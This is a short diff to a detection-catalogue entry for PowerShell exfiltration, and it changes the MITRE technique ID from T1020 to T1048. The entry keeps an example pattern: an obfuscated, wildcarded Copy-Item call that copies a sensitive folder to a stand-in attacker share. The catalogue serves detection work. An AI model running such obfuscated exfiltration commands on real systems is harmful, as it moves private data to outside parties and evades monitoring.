@@ -5,7 +5,7 @@ Platform: powershell
 BinaryPath:
   - "PowerShell cmdlet"
 Category: exfiltration
-MitreID: T1020
+MitreID: T1048
 Patterns:
   - Pattern: "& (gcm C*-I*m) -Path C:\\sensitive -Destination \\\\attacker\\share"
     Wildcards: ["*"]
@@ -26,6 +26,6 @@ Patterns:
     Wildcards: ["*"]
     Notes: "Prefix wildcard — note: matches Get-Item, Set-Item etc."
 Resources:
-  - https://attack.mitre.org/techniques/T1020/
+  - https://attack.mitre.org/techniques/T1048/
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item
 ---
